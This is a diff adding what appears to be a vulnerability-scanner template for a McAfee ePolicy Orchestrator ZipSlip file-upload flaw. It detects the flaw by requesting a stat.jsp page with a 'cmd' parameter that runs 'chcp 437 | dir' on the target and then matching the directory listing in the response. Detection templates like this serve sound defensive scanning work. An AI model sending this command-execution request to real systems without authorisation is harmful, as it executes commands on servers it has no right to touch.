@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: header
+          type: word
+          words:
+            - text/html
+        - part: body
+          regex:
+            - Volume (in drive [A-Z]|Serial Number) is
+          type: regex
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/stat.jsp?cmd=chcp+437+%7c+dir'
+id: mcafee-epo-rce
+info:
+    author: dwisiswant0
+    description: |
+        McAfee ePolicy Orchestrator (ePO) is vulnerable to a ZipSlip vulnerability which allows arbitrary file upload when archives are unpacked if the names of the packed files are not properly sanitized. An attacker can create archives with files containing "../" in their names, making it possible to upload arbitrary files to arbitrary directories or overwrite existing ones during archive extraction.
+    metadata:
+        max-request: 1
+    name: McAfee ePolicy Orchestrator - Arbitrary File Upload
+    reference:
+        - https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/
+    severity: high
+    tags:
+        - mcafee
+        - McAfee-ePolicy-Orchestrator
+        - Perl
